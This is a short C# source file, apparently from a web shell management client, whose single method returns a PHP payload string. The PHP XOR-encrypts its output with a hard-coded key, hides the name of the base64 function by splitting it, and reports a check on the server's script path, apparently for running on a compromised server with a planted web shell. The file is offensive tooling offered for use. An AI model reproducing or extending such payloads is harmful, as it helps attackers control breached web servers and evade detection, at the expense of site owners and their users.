using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WpfApp1.Payload.php.xor
{
    public class Info
    {
        public string info()
        {
            string info = $@"function Encrypt($data) {{
	$key=""e45e329feb5d925b"";
	for ($i=0;$i<strlen($data);$i++) {{
		$data[$i] = $data[$i]^$key[$i+1&15];
	}}
	$bs=""base64_"".""encode"";
	$after=$bs($data."""");
	return $after;
}}echo(Encrypt($D = dirname($_SERVER[""SCRIPT_FILENAME""]) ? ""1"" : ""0"")); ";
            return info;
        }


    }
}
